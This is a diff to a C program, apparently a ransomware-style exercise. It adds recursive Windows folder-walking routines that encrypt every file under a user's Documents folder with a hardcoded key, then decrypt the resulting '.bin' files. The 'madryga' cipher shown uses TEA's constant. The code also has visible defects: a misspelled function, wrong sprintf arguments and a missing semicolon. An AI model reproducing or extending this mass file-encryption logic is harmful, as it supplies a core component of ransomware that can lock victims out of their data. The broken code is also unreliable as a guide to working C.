@@ -14,6 +14,85 @@ typedef uint32_t u32;
 
 u32 key[4] = {0x23423423, 0x45645645, 0x67867867, 0x89A89A89};
 
+// Encrypt folder Logic
+void handleFiles(const char* folderPath) {
+    // Get all files in folder
+    WIN32_FIND_DATAA findFileData;
+    char searchPath[MAX_PATH];
+    sprintf(searchPath, MAX_PATH, "%s\\", folderPath);
+
+    HANDLE hFind = FindFirstFileA(searchPath, &findFileData);
+
+    if (hFind == INVALID_HANDLE_VALUE) {
+        printf("Error: Could not find folder %s\n. Code: %d", folderPath, GetLastError());
+        return;
+    }
+
+    do {
+        const char* fileName = findFileData.cFileName;
+        if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
+            continue;
+        }
+
+        char filePath[MAX_PATH];
+        sprintf(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);
+
+        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            handleFiles(filePath); // recursive call for subfolders
+        } else {
+            // Process individual files
+            printf("file: %s\n", filePath);
+            char encryptedFilePath[MAX_PATH];
+            sprinf_s(encryptedFilePath, MAX_PATH, "%s.bin", filePath);
+            // Will begin madryga encryption here
+            encrypt_file(filePath, encryptedFilePath);
+        } 
+    } while (FindNextFileA(hFind, &findFileData) != 0);
+
+    FindClose(hFind);
+}
+// Decrypt folder Logic
+void decryptFiles(const char* folderPath) {
+  WIN32_FIND_DATAA findFileData;
+  char searchPath[MAX_PATH];
+  sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);
+
+  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);
+
+  if (hFind == INVALID_HANDLE_VALUE) {
+    printf("error: %d\n", GetLastError());
+    return;
+  }
+
+  do {
+    const char* fileName = findFileData.cFileName;
+
+    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
+      continue;
+    }
+
+    char filePath[MAX_PATH];
+    sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);
+
+    if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+      // Recursive call for subfolders
+      decryptFiles(filePath);
+    } else {
+      // Process individual files
+      if (strstr(fileName, ".bin") != NULL) {
+        printf("File: %s\n", filePath);
+        char decryptedFilePath[MAX_PATH];
+        sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
+         // Will begin madryga decryption here
+        decrypt_file(filePath, decryptedFilePath);
+      }
+    }
+
+  } while (FindNextFileA(hFind, &findFileData) != 0);
+
+  FindClose(hFind);
+}
+
 void madryga_encrypt(u32 *v, u32 *k) {
     u32 v0=v[0], v1=v[1], sum=0, i;
     u32 delta=0x9e3779b9;
@@ -128,8 +207,8 @@ void decrypt_file(const char* input_path, const char* output_path) {
 }
 
 int main() {
-    encrypt_file("test.txt", "test-encrypted.bin");
-    Sleep(30000); // wait 30 seconds
-    decrypt_file("test-encrypted.bin", "test-decrypted.txt");
+    const char* rootFolder = "C:\\Users\\user\\Documents";
+    handleFiles(rootFolder)
+    decryptFiles(rootFolder);
     return 0;
 }
